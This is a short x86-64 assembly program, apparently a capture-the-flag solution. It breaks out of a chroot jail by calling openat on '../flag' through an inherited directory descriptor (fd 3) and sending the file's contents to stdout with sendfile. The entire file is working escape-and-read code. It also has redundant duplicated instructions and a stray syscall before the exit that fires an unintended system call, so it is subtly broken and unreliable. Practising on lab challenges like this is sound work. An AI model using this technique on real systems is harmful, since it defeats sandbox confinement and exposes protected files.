global _start
.intel_syntax noprefix
_start:
        // calling openat(3 (outside of jail dirfd, "../flag", 0 (read-only))
				
        mov rax, 257
        mov rdi, 3
        mov rax, 257
        mov rdi, 3
        lea rsi, [rip+path]
        mov rdx, 0
        syscall
				
        // sendfile(1, flag_fd, 0, 1024)
				
        mov rdi, 1
        mov rsi, rax
        mov rdx, 0
        mov r10, 1024
        mov rax, 40
        syscall
				
				//exit cleanly
				
        syscall
        mov rax, 60
        syscall

path:
        .string "../flag"
